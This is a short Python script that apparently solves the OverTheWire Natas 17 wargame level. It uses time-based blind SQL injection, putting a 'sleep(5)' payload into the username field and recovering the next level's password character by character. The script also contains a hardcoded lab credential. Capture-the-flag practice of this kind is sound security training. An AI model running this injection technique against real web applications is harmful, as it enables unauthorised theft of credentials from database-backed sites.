import requests
import string

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
natas17_username = "natas17"
natas17_password = "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC"
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

chars = string.digits + string.ascii_letters


def find_letter(letter: str, password: str) -> str:
    body = f"username=natas18\" and password like binary '{password + letter}%' and sleep(5) #"
    resp = requests.post(url, auth=(
        natas17_username, natas17_password), headers=headers, data=body)
    if resp.elapsed.total_seconds() > 3:
        return letter
    return None


def find_password() -> str:
    password = ""
    while len(password) < 32:
        for letter in chars:
            next_letter = find_letter(letter, password)
            if next_letter is not None:
                password += letter
    return password


if __name__ == "__main__":
    password = find_password()
    print(f"Found password: {password}")
